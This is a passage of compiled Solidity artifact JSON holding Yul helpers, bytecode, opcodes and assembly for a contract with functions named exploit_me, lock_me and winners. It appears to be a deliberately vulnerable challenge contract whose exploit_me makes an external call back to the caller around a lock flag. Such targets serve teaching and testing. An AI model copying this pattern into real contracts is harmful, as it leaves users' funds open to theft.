									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_uint256(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_uint256(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(memPtr) {\n\n    }\n\n    function abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, 0)\n        store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(pos)\n        end := add(pos, 0)\n    }\n\n    function abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos ) -> end {\n\n        pos := abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack( pos)\n\n        end := pos\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100415760003560e01c80634c228cc714610046578063548853a014610050578063a2fb11751461006c575b600080fd5b61004e61009c565b005b61006a6004803603810190610065919061025c565b6100b8565b005b610086600480360381019061008191906102bf565b6101ba565b60405161009391906102fb565b60405180910390f35b60018060006101000a81548160ff021916908315150217905550565b6000600160006101000a81548160ff0219169083151502179055503373ffffffffffffffffffffffffffffffffffffffff166040516100f690610347565b6000604051808303816000865af19150503d8060008114610133576040519150601f19603f3d011682016040523d82523d6000602084013e610138565b606091505b505050600160009054906101000a900460ff1661015457600080fd5b6000819080600181540180825580915050600190039060005260206000200160009091909190916101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600081815481106101ca57600080fd5b906000526020600020016000915054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610229826101fe565b9050919050565b6102398161021e565b811461024457600080fd5b50565b60008135905061025681610230565b92915050565b600060208284031215610272576102716101f9565b5b600061028084828501610247565b91505092915050565b6000819050919050565b61029c81610289565b81146102a757600080fd5b50565b6000813590506102b981610293565b92915050565b6000602082840312156102d5576102d46101f9565b5b60006102e3848285016102aa565b91505092915050565b6102f58161021e565b82525050565b600060208201905061031060008301846102ec565b92915050565b600081905092915050565b50565b6000610331600083610316565b915061033c82610321565b600082019050919050565b600061035282610324565b915081905091905056fea264697066735822122045f02163999e6139e256bc277da5fbb9526477c71a737998964ddbaa993c0a6064736f6c634300080a0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4C228CC7 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x548853A0 EQ PUSH2 0x50 JUMPI DUP1 PUSH4 0xA2FB1175 EQ PUSH2 0x6C JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x9C JUMP JUMPDEST STOP JUMPDEST PUSH2 0x6A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x65 SWAP2 SWAP1 PUSH2 0x25C JUMP JUMPDEST PUSH2 0xB8 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x86 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x81 SWAP2 SWAP1 PUSH2 0x2BF JUMP JUMPDEST PUSH2 0x1BA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x93 SWAP2 SWAP1 PUSH2 0x2FB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 DUP1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD PUSH2 0xF6 SWAP1 PUSH2 0x347 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x133 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x138 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x154 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 DUP1 PUSH1 0x1 DUP2 SLOAD ADD DUP1 DUP3 SSTORE DUP1 SWAP2 POP POP PUSH1 0x1 SWAP1 SUB SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD PUSH1 0x0 SWAP1 SWAP2 SWAP1 SWAP2 SWAP1 SWAP2 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP2 SLOAD DUP2 LT PUSH2 0x1CA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD PUSH1 0x0 SWAP2 POP SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x229 DUP3 PUSH2 0x1FE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x239 DUP2 PUSH2 0x21E JUMP JUMPDEST DUP2 EQ PUSH2 0x244 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x256 DUP2 PUSH2 0x230 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x272 JUMPI PUSH2 0x271 PUSH2 0x1F9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x280 DUP5 DUP3 DUP6 ADD PUSH2 0x247 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x29C DUP2 PUSH2 0x289 JUMP JUMPDEST DUP2 EQ PUSH2 0x2A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2B9 DUP2 PUSH2 0x293 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2D5 JUMPI PUSH2 0x2D4 PUSH2 0x1F9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2E3 DUP5 DUP3 DUP6 ADD PUSH2 0x2AA JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2F5 DUP2 PUSH2 0x21E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x310 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2EC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x331 PUSH1 0x0 DUP4 PUSH2 0x316 JUMP JUMPDEST SWAP2 POP PUSH2 0x33C DUP3 PUSH2 0x321 JUMP JUMPDEST PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x352 DUP3 PUSH2 0x324 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 GASLIMIT CREATE 0x21 PUSH4 0x999E6139 0xE2 JUMP 0xBC 0x27 PUSH30 0xA5FBB9526477C71A737998964DDBAA993C0A6064736F6C634300080A0033 ",
							"sourceMap": "251:319:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;512:55;;;:::i;:::-;;342:162;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;293:24;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;512:55;555:4;548;;:11;;;;;;;;;;;;;;;;;;512:55::o;342:162::-;402:5;395:4;;:12;;;;;;;;;;;;;;;;;;420:10;:15;;:19;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;460:4;;;;;;;;;;;452:13;;;;;;476:7;489:6;476:20;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;342:162;:::o;293:24::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;88:117:1:-;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:139::-;742:5;780:6;767:20;758:29;;796:33;823:5;796:33;:::i;:::-;696:139;;;;:::o;841:329::-;900:6;949:2;937:9;928:7;924:23;920:32;917:119;;;955:79;;:::i;:::-;917:119;1075:1;1100:53;1145:7;1136:6;1125:9;1121:22;1100:53;:::i;:::-;1090:63;;1046:117;841:329;;;;:::o;1176:77::-;1213:7;1242:5;1231:16;;1176:77;;;:::o;1259:122::-;1332:24;1350:5;1332:24;:::i;:::-;1325:5;1322:35;1312:63;;1371:1;1368;1361:12;1312:63;1259:122;:::o;1387:139::-;1433:5;1471:6;1458:20;1449:29;;1487:33;1514:5;1487:33;:::i;:::-;1387:139;;;;:::o;1532:329::-;1591:6;1640:2;1628:9;1619:7;1615:23;1611:32;1608:119;;;1646:79;;:::i;:::-;1608:119;1766:1;1791:53;1836:7;1827:6;1816:9;1812:22;1791:53;:::i;:::-;1781:63;;1737:117;1532:329;;;;:::o;1867:118::-;1954:24;1972:5;1954:24;:::i;:::-;1949:3;1942:37;1867:118;;:::o;1991:222::-;2084:4;2122:2;2111:9;2107:18;2099:26;;2135:71;2203:1;2192:9;2188:17;2179:6;2135:71;:::i;:::-;1991:222;;;;:::o;2219:147::-;2320:11;2357:3;2342:18;;2219:147;;;;:::o;2372:114::-;;:::o;2492:398::-;2651:3;2672:83;2753:1;2748:3;2672:83;:::i;:::-;2665:90;;2764:93;2853:3;2764:93;:::i;:::-;2882:1;2877:3;2873:11;2866:18;;2492:398;;;:::o;2896:379::-;3080:3;3102:147;3245:3;3102:147;:::i;:::-;3095:154;;3266:3;3259:10;;2896:379;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "182800",
								"executionCost": "226",
								"totalCost": "183026"
							},
							"external": {
								"exploit_me(address)": "infinite",
								"lock_me()": "24389",
								"winners(uint256)": "4978"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 251,
									"end": 570,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 251,
									"end": 570,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 251,
									"end": 570,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 251,
									"end": 570,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 251,
									"end": 570,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 251,
									"end": 570,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 251,
									"end": 570,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 251,
									"end": 570,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 251,
									"end": 570,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 251,
									"end": 570,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 251,
									"end": 570,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 251,
									"end": 570,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 251,
									"end": 570,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 251,
									"end": 570,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 251,
									"end": 570,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 251,
									"end": 570,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 251,
									"end": 570,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 251,
									"end": 570,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 251,
									"end": 570,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 251,
									"end": 570,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 251,
									"end": 570,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122045f02163999e6139e256bc277da5fbb9526477c71a737998964ddbaa993c0a6064736f6c634300080a0033",
									".code": [
										{
											"begin": 251,
											"end": 570,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "PUSH",
											"source": 0,
											"value": "4C228CC7"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "PUSH",
											"source": 0,
											"value": "548853A0"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "PUSH",
											"source": 0,
											"value": "A2FB1175"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 251,
											"end": 570,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 251,
											"end": 570,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 512,
											"end": 567,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 512,
											"end": 567,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 512,
											"end": 567,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 512,
											"end": 567,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 512,
											"end": 567,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 512,
											"end": 567,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 512,
											"end": 567,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 512,
											"end": 567,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 342,
											"end": 504,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 342,
											"end": 504,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 342,
											"end": 504,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 342,
											"end": 504,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 342,
											"end": 504,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 342,
											"end": 504,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 342,
											"end": 504,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 342,
											"end": 504,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 342,
											"end": 504,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 342,
											"end": 504,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 342,
											"end": 504,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 342,
											"end": 504,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 342,
											"end": 504,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 342,
											"end": 504,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 342,
											"end": 504,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 342,
											"end": 504,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 342,
											"end": 504,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 342,
											"end": 504,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 342,
											"end": 504,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 342,
											"end": 504,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 342,
											"end": 504,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 342,
											"end": 504,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 512,
											"end": 567,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 512,
											"end": 567,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 555,
											"end": 559,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 548,
											"end": 552,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 548,
											"end": 552,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 548,
											"end": 559,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 548,
											"end": 559,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 548,
											"end": 559,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 548,
											"end": 559,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 548,
											"end": 559,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 548,
											"end": 559,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 548,
											"end": 559,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 548,
											"end": 559,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 548,
											"end": 559,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 548,
											"end": 559,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 548,
											"end": 559,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 548,
											"end": 559,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 548,
											"end": 559,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 548,
											"end": 559,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 548,
											"end": 559,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 548,
											"end": 559,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 548,
											"end": 559,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 548,
											"end": 559,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 512,
